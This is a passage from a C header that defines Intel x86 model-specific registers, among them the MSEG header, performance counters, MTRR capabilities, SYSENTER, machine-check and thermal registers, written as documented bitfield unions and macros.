   * reading the VMX capability MSR IA32_VMX_MISC.
   *
   * @see Vol3D[A.6(MISCELLANEOUS DATA)]
   */
  UINT32 MsegHeaderRevision;

  /**
   * @brief SMM-transfer monitor features field
   *
   * Bits 31:1 of this field are reserved and must be zero. Bit 0 of the field is the IA-32e mode
   * SMM feature bit. It indicates whether the logical processor will be in IA-32e mode after the
   * STM is activated.
   *
   * @see Vol3C[34.15.6(Activating the Dual-Monitor Treatment)]
   */
  UINT32 MonitorFeatures;

  /**
   * Define values for the MonitorFeatures field of MSEG_HEADER.
   */
#define IA32_STM_FEATURES_IA32E 0x00000001

  /**
   * Fields that determine how processor state is loaded when the STM is activated. SMM code should
   * establish these fields so that activating of the STM invokes the STM's initialization code.
   *
   * @see Vol3C[34.15.6.5(Loading Host State)]
   */
  UINT32 GdtrLimit;
  UINT32 GdtrBaseOffset;
  UINT32 CsSelector;
  UINT32 EipOffset;
  UINT32 EspOffset;
  UINT32 Cr3Offset;
} IA32_MSEG_HEADER;

/**
 * Base address of the logical processor's SMRAM image.
 *
 * @remarks If IA32_VMX_MISC[15]
 */
#define IA32_SMBASE 0x0000009E
/**
 * @defgroup IA32_PMC \
 *           IA32_PMC(n)
 *
 * General Performance Counters.
 *
 * @remarks If CPUID.0AH: EAX[15:8] > n
 * @{
 */
#define IA32_PMC0 0x000000C1
#define IA32_PMC1 0x000000C2
#define IA32_PMC2 0x000000C3
#define IA32_PMC3 0x000000C4
#define IA32_PMC4 0x000000C5
#define IA32_PMC5 0x000000C6
#define IA32_PMC6 0x000000C7
#define IA32_PMC7 0x000000C8
/**
 * @}
 */

/**
 * TSC Frequency Clock Counter.
 *
 * @remarks If CPUID.06H: ECX[0] = 1
 */
#define IA32_MPERF 0x000000E7
typedef struct {
  /**
   * @brief C0 TSC Frequency Clock Count
   *
   * Increments at fixed interval (relative to TSC freq.) when the logical processor is in C0.
   * Cleared upon overflow / wrap-around of IA32_APERF.
   */
  UINT64 C0Mcnt;
} IA32_MPERF_REGISTER;

/**
 * Actual Performance Clock Counter
 *
 * @remarks If CPUID.06H: ECX[0] = 1
 */
#define IA32_APERF 0x000000E8
typedef struct {
  /**
   * @brief C0 Actual Frequency Clock Count
   *
   * Accumulates core clock counts at the coordinated clock frequency, when the logical processor is
   * in C0. Cleared upon overflow / wrap-around of IA32_MPERF.
   */
  UINT64 C0Acnt;
} IA32_APERF_REGISTER;

/**
 * MTRR Capability.
 *
 * @see Vol3A[11.11.2.1(IA32_MTRR_DEF_TYPE MSR)]
 * @see Vol3A[11.11.1(MTRR Feature Identification)] (reference)
 */
#define IA32_MTRR_CAPABILITIES 0x000000FE
typedef union {
  struct {
    /**
     * @brief VCNT (variable range registers count) field
     *
     * [Bits 7:0] Indicates the number of variable ranges implemented on the processor.
     */
    UINT64 VariableRangeCount : 8;
#define IA32_MTRR_CAPABILITIES_VARIABLE_RANGE_COUNT_BIT 0
#define IA32_MTRR_CAPABILITIES_VARIABLE_RANGE_COUNT_FLAG 0xFF
#define IA32_MTRR_CAPABILITIES_VARIABLE_RANGE_COUNT_MASK 0xFF
#define IA32_MTRR_CAPABILITIES_VARIABLE_RANGE_COUNT(_) (((_) >> 0) & 0xFF)

    /**
     * @brief FIX (fixed range registers supported) flag
     *
     * [Bit 8] Fixed range MTRRs (IA32_MTRR_FIX64K_00000 through IA32_MTRR_FIX4K_0F8000) are
     * supported when set; no fixed range registers are supported when clear.
     */
    UINT64 FixedRangeSupported : 1;
#define IA32_MTRR_CAPABILITIES_FIXED_RANGE_SUPPORTED_BIT 8
#define IA32_MTRR_CAPABILITIES_FIXED_RANGE_SUPPORTED_FLAG 0x100
#define IA32_MTRR_CAPABILITIES_FIXED_RANGE_SUPPORTED_MASK 0x01
#define IA32_MTRR_CAPABILITIES_FIXED_RANGE_SUPPORTED(_) (((_) >> 8) & 0x01)
    UINT64 Reserved1 : 1;

    /**
     * @brief WC (write combining) flag
     *
     * [Bit 10] The write-combining (WC) memory type is supported when set; the WC type is not
     * supported when clear.
     */
    UINT64 WcSupported : 1;
#define IA32_MTRR_CAPABILITIES_WC_SUPPORTED_BIT 10
#define IA32_MTRR_CAPABILITIES_WC_SUPPORTED_FLAG 0x400
#define IA32_MTRR_CAPABILITIES_WC_SUPPORTED_MASK 0x01
#define IA32_MTRR_CAPABILITIES_WC_SUPPORTED(_) (((_) >> 10) & 0x01)

    /**
     * @brief SMRR (System-Management Range Register) flag
     *
     * [Bit 11] The system-management range register (SMRR) interface is supported when bit 11 is
     * set; the SMRR interface is not supported when clear.
     */
    UINT64 SmrrSupported : 1;
#define IA32_MTRR_CAPABILITIES_SMRR_SUPPORTED_BIT 11
#define IA32_MTRR_CAPABILITIES_SMRR_SUPPORTED_FLAG 0x800
#define IA32_MTRR_CAPABILITIES_SMRR_SUPPORTED_MASK 0x01
#define IA32_MTRR_CAPABILITIES_SMRR_SUPPORTED(_) (((_) >> 11) & 0x01)
    UINT64 Reserved2 : 52;
  };

  UINT64 Flags;
} IA32_MTRR_CAPABILITIES_REGISTER;

/**
 * @brief SYSENTER_CS_MSR <b>(R/W)</b>
 *
 * The lower 16 bits of this MSR are the segment selector for the privilege level 0 code segment.
 * This value is also used to determine the segment selector of the privilege level 0 stack segment.
 * This value cannot indicate a null selector.
 *
 * @remarks 06_01H
 * @see Vol2B[4.3(Instructions (M-U) | SYSCALL - Fast System Call)] (reference)
 */
#define IA32_SYSENTER_CS 0x00000174
typedef union {
  struct {
    /**
     * [Bits 15:0] CS Selector.
     */
    UINT64 CsSelector : 16;
#define IA32_SYSENTER_CS_CS_SELECTOR_BIT 0
#define IA32_SYSENTER_CS_CS_SELECTOR_FLAG 0xFFFF
#define IA32_SYSENTER_CS_CS_SELECTOR_MASK 0xFFFF
#define IA32_SYSENTER_CS_CS_SELECTOR(_) (((_) >> 0) & 0xFFFF)

    /**
     * [Bits 31:16] Not used.
     *
     * @remarks Can be read and written.
     */
    UINT64 NotUsed1 : 16;
#define IA32_SYSENTER_CS_NOT_USED_1_BIT 16
#define IA32_SYSENTER_CS_NOT_USED_1_FLAG 0xFFFF0000
#define IA32_SYSENTER_CS_NOT_USED_1_MASK 0xFFFF
#define IA32_SYSENTER_CS_NOT_USED_1(_) (((_) >> 16) & 0xFFFF)

    /**
     * [Bits 63:32] Not used.
     *
     * @remarks Writes ignored; reads return zero.
     */
    UINT64 NotUsed2 : 32;
#define IA32_SYSENTER_CS_NOT_USED_2_BIT 32
#define IA32_SYSENTER_CS_NOT_USED_2_FLAG 0xFFFFFFFF00000000
#define IA32_SYSENTER_CS_NOT_USED_2_MASK 0xFFFFFFFF
#define IA32_SYSENTER_CS_NOT_USED_2(_) (((_) >> 32) & 0xFFFFFFFF)
  };

  UINT64 Flags;
} IA32_SYSENTER_CS_REGISTER;

/**
 * @brief SYSENTER_ESP_MSR <b>(R/W)</b>
 *
 * The value of this MSR is loaded into RSP (thus, this value contains the stack pointer for the
 * privilege level 0 stack). This value cannot represent a non-canonical address. In protected mode,
 * only bits 31:0 are loaded.
 *
 * @remarks 06_01H
 * @see Vol2B[4.3(Instructions (M-U) | SYSCALL - Fast System Call)] (reference)
 */
#define IA32_SYSENTER_ESP 0x00000175

/**
 * @brief SYSENTER_EIP_MSR <b>(R/W)</b>
 *
 * The value of this MSR is loaded into RIP (thus, this value references the first instruction of
 * the selected operating procedure or routine). In protected mode, only bits 31:0 are loaded.
 *
 * @remarks 06_01H
 * @see Vol2B[4.3(Instructions (M-U) | SYSCALL - Fast System Call)] (reference)
 */
#define IA32_SYSENTER_EIP 0x00000176

/**
 * Global Machine Check Capability.
 *
 * @remarks 06_01H
 */
#define IA32_MCG_CAP 0x00000179
typedef union {
  struct {
    /**
     * [Bits 7:0] Number of reporting banks.
     */
    UINT64 Count : 8;
#define IA32_MCG_CAP_COUNT_BIT 0
#define IA32_MCG_CAP_COUNT_FLAG 0xFF
#define IA32_MCG_CAP_COUNT_MASK 0xFF
#define IA32_MCG_CAP_COUNT(_) (((_) >> 0) & 0xFF)

    /**
     * [Bit 8] IA32_MCG_CTL is present if this bit is set.
     */
    UINT64 McgCtlP : 1;
#define IA32_MCG_CAP_MCG_CTL_P_BIT 8
#define IA32_MCG_CAP_MCG_CTL_P_FLAG 0x100
#define IA32_MCG_CAP_MCG_CTL_P_MASK 0x01
#define IA32_MCG_CAP_MCG_CTL_P(_) (((_) >> 8) & 0x01)

    /**
     * [Bit 9] Extended machine check state registers are present if this bit is set.
     */
    UINT64 McgExtP : 1;
#define IA32_MCG_CAP_MCG_EXT_P_BIT 9
#define IA32_MCG_CAP_MCG_EXT_P_FLAG 0x200
#define IA32_MCG_CAP_MCG_EXT_P_MASK 0x01
#define IA32_MCG_CAP_MCG_EXT_P(_) (((_) >> 9) & 0x01)

    /**
     * [Bit 10] Support for corrected MC error event is present.
     *
     * @remarks 06_01H
     */
    UINT64 McpCmciP : 1;
#define IA32_MCG_CAP_MCP_CMCI_P_BIT 10
#define IA32_MCG_CAP_MCP_CMCI_P_FLAG 0x400
#define IA32_MCG_CAP_MCP_CMCI_P_MASK 0x01
#define IA32_MCG_CAP_MCP_CMCI_P(_) (((_) >> 10) & 0x01)

    /**
     * [Bit 11] Threshold-based error status register are present if this bit is set.
     */
    UINT64 McgTesP : 1;
#define IA32_MCG_CAP_MCG_TES_P_BIT 11
#define IA32_MCG_CAP_MCG_TES_P_FLAG 0x800
#define IA32_MCG_CAP_MCG_TES_P_MASK 0x01
#define IA32_MCG_CAP_MCG_TES_P(_) (((_) >> 11) & 0x01)
    UINT64 Reserved1 : 4;

    /**
     * [Bits 23:16] Number of extended machine check state registers present.
     */
    UINT64 McgExtCnt : 8;
#define IA32_MCG_CAP_MCG_EXT_CNT_BIT 16
#define IA32_MCG_CAP_MCG_EXT_CNT_FLAG 0xFF0000
#define IA32_MCG_CAP_MCG_EXT_CNT_MASK 0xFF
#define IA32_MCG_CAP_MCG_EXT_CNT(_) (((_) >> 16) & 0xFF)

    /**
     * [Bit 24] The processor supports software error recovery if this bit is set.
     */
    UINT64 McgSerP : 1;
#define IA32_MCG_CAP_MCG_SER_P_BIT 24
#define IA32_MCG_CAP_MCG_SER_P_FLAG 0x1000000
#define IA32_MCG_CAP_MCG_SER_P_MASK 0x01
#define IA32_MCG_CAP_MCG_SER_P(_) (((_) >> 24) & 0x01)
    UINT64 Reserved2 : 1;

    /**
     * [Bit 26] Indicates that the processor allows platform firmware to be invoked when an error is
     * detected so that it may provide additional platform specific information in an ACPI format
     * "Generic Error Data Entry" that augments the data included in machine check bank registers.
     *
     * @remarks 06_3EH
     */
    UINT64 McgElogP : 1;
#define IA32_MCG_CAP_MCG_ELOG_P_BIT 26
#define IA32_MCG_CAP_MCG_ELOG_P_FLAG 0x4000000
#define IA32_MCG_CAP_MCG_ELOG_P_MASK 0x01
#define IA32_MCG_CAP_MCG_ELOG_P(_) (((_) >> 26) & 0x01)

    /**
     * [Bit 27] Indicates that the processor supports extended state in IA32_MCG_STATUS and
     * associated MSR necessary to configure Local Machine Check Exception (LMCE).
     *
     * @remarks 06_3EH
     */
    UINT64 McgLmceP : 1;
#define IA32_MCG_CAP_MCG_LMCE_P_BIT 27
#define IA32_MCG_CAP_MCG_LMCE_P_FLAG 0x8000000
#define IA32_MCG_CAP_MCG_LMCE_P_MASK 0x01
#define IA32_MCG_CAP_MCG_LMCE_P(_) (((_) >> 27) & 0x01)
    UINT64 Reserved3 : 36;
  };

  UINT64 Flags;
} IA32_MCG_CAP_REGISTER;

/**
 * Global Machine Check Status.
 *
 * @remarks 06_01H
 */
#define IA32_MCG_STATUS 0x0000017A
typedef union {
  struct {
    /**
     * [Bit 0] Restart IP valid.
     *
     * @remarks 06_01H
     */
    UINT64 Ripv : 1;
#define IA32_MCG_STATUS_RIPV_BIT 0
#define IA32_MCG_STATUS_RIPV_FLAG 0x01
#define IA32_MCG_STATUS_RIPV_MASK 0x01
#define IA32_MCG_STATUS_RIPV(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Error IP valid.
     *
     * @remarks 06_01H
     */
    UINT64 Eipv : 1;
#define IA32_MCG_STATUS_EIPV_BIT 1
#define IA32_MCG_STATUS_EIPV_FLAG 0x02
#define IA32_MCG_STATUS_EIPV_MASK 0x01
#define IA32_MCG_STATUS_EIPV(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] Machine check in progress.
     *
     * @remarks 06_01H
     */
    UINT64 Mcip : 1;
#define IA32_MCG_STATUS_MCIP_BIT 2
#define IA32_MCG_STATUS_MCIP_FLAG 0x04
#define IA32_MCG_STATUS_MCIP_MASK 0x01
#define IA32_MCG_STATUS_MCIP(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] If IA32_MCG_CAP.LMCE_P[27] = 1.
     */
    UINT64 LmceS : 1;
#define IA32_MCG_STATUS_LMCE_S_BIT 3
#define IA32_MCG_STATUS_LMCE_S_FLAG 0x08
#define IA32_MCG_STATUS_LMCE_S_MASK 0x01
#define IA32_MCG_STATUS_LMCE_S(_) (((_) >> 3) & 0x01)
    UINT64 Reserved1 : 60;
  };

  UINT64 Flags;
} IA32_MCG_STATUS_REGISTER;

/**
 * Global Machine Check Control.
 *
 * @remarks If IA32_MCG_CAP.CTL_P[8] = 1
 */
#define IA32_MCG_CTL 0x0000017B
/**
 * @defgroup IA32_PERFEVTSEL \
 *           IA32_PERFEVTSEL(n)
 *
 * Performance Event Select Register n.
 *
 * @remarks If CPUID.0AH: EAX[15:8] > n
 * @{
 */
#define IA32_PERFEVTSEL0 0x00000186
#define IA32_PERFEVTSEL1 0x00000187
#define IA32_PERFEVTSEL2 0x00000188
#define IA32_PERFEVTSEL3 0x00000189
typedef union {
  struct {
    /**
     * [Bits 7:0] Selects a performance event logic unit.
     */
    UINT64 EventSelect : 8;
#define IA32_PERFEVTSEL_EVENT_SELECT_BIT 0
#define IA32_PERFEVTSEL_EVENT_SELECT_FLAG 0xFF
#define IA32_PERFEVTSEL_EVENT_SELECT_MASK 0xFF
#define IA32_PERFEVTSEL_EVENT_SELECT(_) (((_) >> 0) & 0xFF)

    /**
     * [Bits 15:8] Qualifies the microarchitectural condition to detect on the selected event logic.
     */
    UINT64 UMask : 8;
#define IA32_PERFEVTSEL_U_MASK_BIT 8
#define IA32_PERFEVTSEL_U_MASK_FLAG 0xFF00
#define IA32_PERFEVTSEL_U_MASK_MASK 0xFF
#define IA32_PERFEVTSEL_U_MASK(_) (((_) >> 8) & 0xFF)

    /**
     * [Bit 16] Counts while in privilege level is not ring 0.
     */
    UINT64 Usr : 1;
#define IA32_PERFEVTSEL_USR_BIT 16
#define IA32_PERFEVTSEL_USR_FLAG 0x10000
#define IA32_PERFEVTSEL_USR_MASK 0x01
#define IA32_PERFEVTSEL_USR(_) (((_) >> 16) & 0x01)

    /**
     * [Bit 17] Counts while in privilege level is ring 0.
     */
    UINT64 Os : 1;
#define IA32_PERFEVTSEL_OS_BIT 17
#define IA32_PERFEVTSEL_OS_FLAG 0x20000
#define IA32_PERFEVTSEL_OS_MASK 0x01
#define IA32_PERFEVTSEL_OS(_) (((_) >> 17) & 0x01)

    /**
     * [Bit 18] Enables edge detection if set.
     */
    UINT64 Edge : 1;
#define IA32_PERFEVTSEL_EDGE_BIT 18
#define IA32_PERFEVTSEL_EDGE_FLAG 0x40000
#define IA32_PERFEVTSEL_EDGE_MASK 0x01
#define IA32_PERFEVTSEL_EDGE(_) (((_) >> 18) & 0x01)

    /**
     * [Bit 19] Enables pin control.
     */
    UINT64 Pc : 1;
#define IA32_PERFEVTSEL_PC_BIT 19
#define IA32_PERFEVTSEL_PC_FLAG 0x80000
#define IA32_PERFEVTSEL_PC_MASK 0x01
#define IA32_PERFEVTSEL_PC(_) (((_) >> 19) & 0x01)

    /**
     * [Bit 20] Enables interrupt on counter overflow.
     */
    UINT64 Intr : 1;
#define IA32_PERFEVTSEL_INTR_BIT 20
#define IA32_PERFEVTSEL_INTR_FLAG 0x100000
#define IA32_PERFEVTSEL_INTR_MASK 0x01
#define IA32_PERFEVTSEL_INTR(_) (((_) >> 20) & 0x01)

    /**
     * [Bit 21] When set to 1, it enables counting the associated event conditions occurring across
     * all logical processors sharing a processor core. When set to 0, the counter only increments
     * the associated event conditions occurring in the logical processor which programmed the MSR.
     */
    UINT64 AnyThread : 1;
#define IA32_PERFEVTSEL_ANY_THREAD_BIT 21
#define IA32_PERFEVTSEL_ANY_THREAD_FLAG 0x200000
#define IA32_PERFEVTSEL_ANY_THREAD_MASK 0x01
#define IA32_PERFEVTSEL_ANY_THREAD(_) (((_) >> 21) & 0x01)

    /**
     * [Bit 22] Enables the corresponding performance counter to commence counting when this bit is
     * set.
     */
    UINT64 En : 1;
#define IA32_PERFEVTSEL_EN_BIT 22
#define IA32_PERFEVTSEL_EN_FLAG 0x400000
#define IA32_PERFEVTSEL_EN_MASK 0x01
#define IA32_PERFEVTSEL_EN(_) (((_) >> 22) & 0x01)

    /**
     * [Bit 23] Invert the CMASK.
     */
    UINT64 Inv : 1;
#define IA32_PERFEVTSEL_INV_BIT 23
#define IA32_PERFEVTSEL_INV_FLAG 0x800000
#define IA32_PERFEVTSEL_INV_MASK 0x01
#define IA32_PERFEVTSEL_INV(_) (((_) >> 23) & 0x01)

    /**
     * [Bits 31:24] When CMASK is not zero, the corresponding performance counter increments each
     * cycle if the event count is greater than or equal to the CMASK.
     */
    UINT64 Cmask : 8;
#define IA32_PERFEVTSEL_CMASK_BIT 24
#define IA32_PERFEVTSEL_CMASK_FLAG 0xFF000000
#define IA32_PERFEVTSEL_CMASK_MASK 0xFF
#define IA32_PERFEVTSEL_CMASK(_) (((_) >> 24) & 0xFF)
    UINT64 Reserved1 : 32;
  };

  UINT64 Flags;
} IA32_PERFEVTSEL_REGISTER;

/**
 * @}
 */

/**
 * Current Performance Status.
 *
 * @remarks 0F_03H
 * @see Vol3B[14.1.1(Software Interface For Initiating Performance State Transitions)]
 */
#define IA32_PERF_STATUS 0x00000198
typedef union {
  struct {
    /**
     * [Bits 15:0] Current performance State Value.
     */
    UINT64 StateValue : 16;
#define IA32_PERF_STATUS_STATE_VALUE_BIT 0
#define IA32_PERF_STATUS_STATE_VALUE_FLAG 0xFFFF
#define IA32_PERF_STATUS_STATE_VALUE_MASK 0xFFFF
#define IA32_PERF_STATUS_STATE_VALUE(_) (((_) >> 0) & 0xFFFF)
    UINT64 Reserved1 : 48;
  };

  UINT64 Flags;
} IA32_PERF_STATUS_REGISTER;

/**
 * @brief Performance Control <b>(R/W)</b>
 *
 * Performance Control. Software makes a request for a new Performance state (P-State) by writing
 * this MSR.
 *
 * @remarks 0F_03H
 * @see Vol3B[14.1.1(Software Interface For Initiating Performance State Transitions)]
 */
#define IA32_PERF_CTL 0x00000199
typedef union {
  struct {
    /**
     * [Bits 15:0] Target performance State Value.
     */
    UINT64 TargetStateValue : 16;
#define IA32_PERF_CTL_TARGET_STATE_VALUE_BIT 0
#define IA32_PERF_CTL_TARGET_STATE_VALUE_FLAG 0xFFFF
#define IA32_PERF_CTL_TARGET_STATE_VALUE_MASK 0xFFFF
#define IA32_PERF_CTL_TARGET_STATE_VALUE(_) (((_) >> 0) & 0xFFFF)
    UINT64 Reserved1 : 16;

    /**
     * [Bit 32] IDA Engage.
     *
     * @remarks 06_0FH (Mobile only)
     */
    UINT64 IdaEngage : 1;
#define IA32_PERF_CTL_IDA_ENGAGE_BIT 32
#define IA32_PERF_CTL_IDA_ENGAGE_FLAG 0x100000000
#define IA32_PERF_CTL_IDA_ENGAGE_MASK 0x01
#define IA32_PERF_CTL_IDA_ENGAGE(_) (((_) >> 32) & 0x01)
    UINT64 Reserved2 : 31;
  };

  UINT64 Flags;
} IA32_PERF_CTL_REGISTER;

/**
 * Clock Modulation Control.
 *
 * @remarks If CPUID.01H:EDX[22] = 1
 * @see Vol3B[14.7.3(Software Controlled Clock Modulation)]
 */
#define IA32_CLOCK_MODULATION 0x0000019A
typedef union {
  struct {
    /**
     * [Bit 0] Extended On-Demand Clock Modulation Duty Cycle.
     *
     * @remarks If CPUID.06H:EAX[5] = 1
     */
    UINT64 ExtendedOnDemandClockModulationDutyCycle : 1;
#define IA32_CLOCK_MODULATION_EXTENDED_ON_DEMAND_CLOCK_MODULATION_DUTY_CYCLE_BIT 0
#define IA32_CLOCK_MODULATION_EXTENDED_ON_DEMAND_CLOCK_MODULATION_DUTY_CYCLE_FLAG 0x01
#define IA32_CLOCK_MODULATION_EXTENDED_ON_DEMAND_CLOCK_MODULATION_DUTY_CYCLE_MASK 0x01
#define IA32_CLOCK_MODULATION_EXTENDED_ON_DEMAND_CLOCK_MODULATION_DUTY_CYCLE(_) (((_) >> 0) & 0x01)

    /**
     * @brief On-Demand Clock Modulation Duty Cycle
     *
     * [Bits 3:1] On-Demand Clock Modulation Duty Cycle: Specific encoded values for target duty
     * cycle modulation.
     *
     * @remarks If CPUID.01H:EDX[22] = 1
     */
    UINT64 OnDemandClockModulationDutyCycle : 3;
#define IA32_CLOCK_MODULATION_ON_DEMAND_CLOCK_MODULATION_DUTY_CYCLE_BIT 1
#define IA32_CLOCK_MODULATION_ON_DEMAND_CLOCK_MODULATION_DUTY_CYCLE_FLAG 0x0E
#define IA32_CLOCK_MODULATION_ON_DEMAND_CLOCK_MODULATION_DUTY_CYCLE_MASK 0x07
#define IA32_CLOCK_MODULATION_ON_DEMAND_CLOCK_MODULATION_DUTY_CYCLE(_) (((_) >> 1) & 0x07)

    /**
     * @brief On-Demand Clock Modulation Enable
     *
     * [Bit 4] On-Demand Clock Modulation Enable: Set 1 to enable modulation.
     *
     * @remarks If CPUID.01H:EDX[22] = 1
     */
    UINT64 OnDemandClockModulationEnable : 1;
#define IA32_CLOCK_MODULATION_ON_DEMAND_CLOCK_MODULATION_ENABLE_BIT 4
#define IA32_CLOCK_MODULATION_ON_DEMAND_CLOCK_MODULATION_ENABLE_FLAG 0x10
#define IA32_CLOCK_MODULATION_ON_DEMAND_CLOCK_MODULATION_ENABLE_MASK 0x01
#define IA32_CLOCK_MODULATION_ON_DEMAND_CLOCK_MODULATION_ENABLE(_) (((_) >> 4) & 0x01)
    UINT64 Reserved1 : 59;
  };

  UINT64 Flags;
} IA32_CLOCK_MODULATION_REGISTER;

/**
 * @brief Thermal Interrupt Control <b>(R/W)</b>
 *
 * Thermal Interrupt Control. Enables and disables the generation of an interrupt on temperature
 * transitions detected with the processor's thermal sensors and thermal monitor.
 *
 * @remarks If CPUID.01H:EDX[22] = 1
 * @see Vol3B[14.7.2(Thermal Monitor)]
 */
#define IA32_THERM_INTERRUPT 0x0000019B
typedef union {
  struct {
    /**
     * [Bit 0] High-Temperature Interrupt Enable.
     *
     * @remarks If CPUID.01H:EDX[22] = 1
     */
    UINT64 HighTemperatureInterruptEnable : 1;
#define IA32_THERM_INTERRUPT_HIGH_TEMPERATURE_INTERRUPT_ENABLE_BIT 0
#define IA32_THERM_INTERRUPT_HIGH_TEMPERATURE_INTERRUPT_ENABLE_FLAG 0x01
#define IA32_THERM_INTERRUPT_HIGH_TEMPERATURE_INTERRUPT_ENABLE_MASK 0x01
#define IA32_THERM_INTERRUPT_HIGH_TEMPERATURE_INTERRUPT_ENABLE(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Low-Temperature Interrupt Enable.
     *
     * @remarks If CPUID.01H:EDX[22] = 1
     */
    UINT64 LowTemperatureInterruptEnable : 1;
#define IA32_THERM_INTERRUPT_LOW_TEMPERATURE_INTERRUPT_ENABLE_BIT 1
#define IA32_THERM_INTERRUPT_LOW_TEMPERATURE_INTERRUPT_ENABLE_FLAG 0x02
#define IA32_THERM_INTERRUPT_LOW_TEMPERATURE_INTERRUPT_ENABLE_MASK 0x01
#define IA32_THERM_INTERRUPT_LOW_TEMPERATURE_INTERRUPT_ENABLE(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] PROCHOT\# Interrupt Enable.
     *
     * @remarks If CPUID.01H:EDX[22] = 1
     */
    UINT64 ProchotInterruptEnable : 1;
#define IA32_THERM_INTERRUPT_PROCHOT_INTERRUPT_ENABLE_BIT 2
#define IA32_THERM_INTERRUPT_PROCHOT_INTERRUPT_ENABLE_FLAG 0x04
#define IA32_THERM_INTERRUPT_PROCHOT_INTERRUPT_ENABLE_MASK 0x01
#define IA32_THERM_INTERRUPT_PROCHOT_INTERRUPT_ENABLE(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] FORCEPR\# Interrupt Enable.
     *
     * @remarks If CPUID.01H:EDX[22] = 1
     */
    UINT64 ForceprInterruptEnable : 1;
#define IA32_THERM_INTERRUPT_FORCEPR_INTERRUPT_ENABLE_BIT 3
#define IA32_THERM_INTERRUPT_FORCEPR_INTERRUPT_ENABLE_FLAG 0x08
#define IA32_THERM_INTERRUPT_FORCEPR_INTERRUPT_ENABLE_MASK 0x01
#define IA32_THERM_INTERRUPT_FORCEPR_INTERRUPT_ENABLE(_) (((_) >> 3) & 0x01)

    /**
     * [Bit 4] Critical Temperature Interrupt Enable.
     *
     * @remarks If CPUID.01H:EDX[22] = 1
     */
    UINT64 CriticalTemperatureInterruptEnable : 1;
#define IA32_THERM_INTERRUPT_CRITICAL_TEMPERATURE_INTERRUPT_ENABLE_BIT 4
#define IA32_THERM_INTERRUPT_CRITICAL_TEMPERATURE_INTERRUPT_ENABLE_FLAG 0x10
#define IA32_THERM_INTERRUPT_CRITICAL_TEMPERATURE_INTERRUPT_ENABLE_MASK 0x01
#define IA32_THERM_INTERRUPT_CRITICAL_TEMPERATURE_INTERRUPT_ENABLE(_) (((_) >> 4) & 0x01)
    UINT64 Reserved1 : 3;

    /**
     * [Bits 14:8] Threshold \#1 Value
     *
     * @remarks If CPUID.01H:EDX[22] = 1
     */
    UINT64 Threshold1Value : 7;
#define IA32_THERM_INTERRUPT_THRESHOLD1_VALUE_BIT 8
#define IA32_THERM_INTERRUPT_THRESHOLD1_VALUE_FLAG 0x7F00
#define IA32_THERM_INTERRUPT_THRESHOLD1_VALUE_MASK 0x7F
#define IA32_THERM_INTERRUPT_THRESHOLD1_VALUE(_) (((_) >> 8) & 0x7F)

    /**
     * [Bit 15] Threshold \#1 Interrupt Enable.
     *
     * @remarks If CPUID.01H:EDX[22] = 1
     */
    UINT64 Threshold1InterruptEnable : 1;
#define IA32_THERM_INTERRUPT_THRESHOLD1_INTERRUPT_ENABLE_BIT 15
#define IA32_THERM_INTERRUPT_THRESHOLD1_INTERRUPT_ENABLE_FLAG 0x8000
#define IA32_THERM_INTERRUPT_THRESHOLD1_INTERRUPT_ENABLE_MASK 0x01
#define IA32_THERM_INTERRUPT_THRESHOLD1_INTERRUPT_ENABLE(_) (((_) >> 15) & 0x01)

    /**
     * [Bits 22:16] Threshold \#2 Value.
     *
     * @remarks If CPUID.01H:EDX[22] = 1
     */
    UINT64 Threshold2Value : 7;
#define IA32_THERM_INTERRUPT_THRESHOLD2_VALUE_BIT 16
#define IA32_THERM_INTERRUPT_THRESHOLD2_VALUE_FLAG 0x7F0000
#define IA32_THERM_INTERRUPT_THRESHOLD2_VALUE_MASK 0x7F
#define IA32_THERM_INTERRUPT_THRESHOLD2_VALUE(_) (((_) >> 16) & 0x7F)

    /**
     * [Bit 23] Threshold \#2 Interrupt Enable.
     *
     * @remarks If CPUID.01H:EDX[22] = 1
     */
    UINT64 Threshold2InterruptEnable : 1;
#define IA32_THERM_INTERRUPT_THRESHOLD2_INTERRUPT_ENABLE_BIT 23
#define IA32_THERM_INTERRUPT_THRESHOLD2_INTERRUPT_ENABLE_FLAG 0x800000
#define IA32_THERM_INTERRUPT_THRESHOLD2_INTERRUPT_ENABLE_MASK 0x01
#define IA32_THERM_INTERRUPT_THRESHOLD2_INTERRUPT_ENABLE(_) (((_) >> 23) & 0x01)

    /**
     * [Bit 24] Power Limit Notification Enable.
     *
     * @remarks If CPUID.06H:EAX[4] = 1
     */
    UINT64 PowerLimitNotificationEnable : 1;
#define IA32_THERM_INTERRUPT_POWER_LIMIT_NOTIFICATION_ENABLE_BIT 24
#define IA32_THERM_INTERRUPT_POWER_LIMIT_NOTIFICATION_ENABLE_FLAG 0x1000000
#define IA32_THERM_INTERRUPT_POWER_LIMIT_NOTIFICATION_ENABLE_MASK 0x01
#define IA32_THERM_INTERRUPT_POWER_LIMIT_NOTIFICATION_ENABLE(_) (((_) >> 24) & 0x01)
    UINT64 Reserved2 : 39;
  };

  UINT64 Flags;
} IA32_THERM_INTERRUPT_REGISTER;

/**
 * @brief Thermal Status Information <b>(RO)</b>
 *
 * Thermal Status Information. Contains status information about the processor's thermal sensor and
 * automatic thermal monitoring facilities.
 *
 * @remarks If CPUID.01H:EDX[22] = 1
 * @see Vol3B[14.7.2(Thermal Monitor)]
 */
#define IA32_THERM_STATUS 0x0000019C
typedef union {
  struct {
    /**
     * [Bit 0] Thermal Status
     *
     * @remarks If CPUID.01H:EDX[22] = 1
     */
    UINT64 ThermalStatus : 1;
#define IA32_THERM_STATUS_THERMAL_STATUS_BIT 0
#define IA32_THERM_STATUS_THERMAL_STATUS_FLAG 0x01
#define IA32_THERM_STATUS_THERMAL_STATUS_MASK 0x01
#define IA32_THERM_STATUS_THERMAL_STATUS(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Thermal Status Log
     *
     * @remarks If CPUID.01H:EDX[22] = 1
     */
    UINT64 ThermalStatusLog : 1;
#define IA32_THERM_STATUS_THERMAL_STATUS_LOG_BIT 1
#define IA32_THERM_STATUS_THERMAL_STATUS_LOG_FLAG 0x02
#define IA32_THERM_STATUS_THERMAL_STATUS_LOG_MASK 0x01
#define IA32_THERM_STATUS_THERMAL_STATUS_LOG(_) (((_) >> 1) & 0x01)

    /**
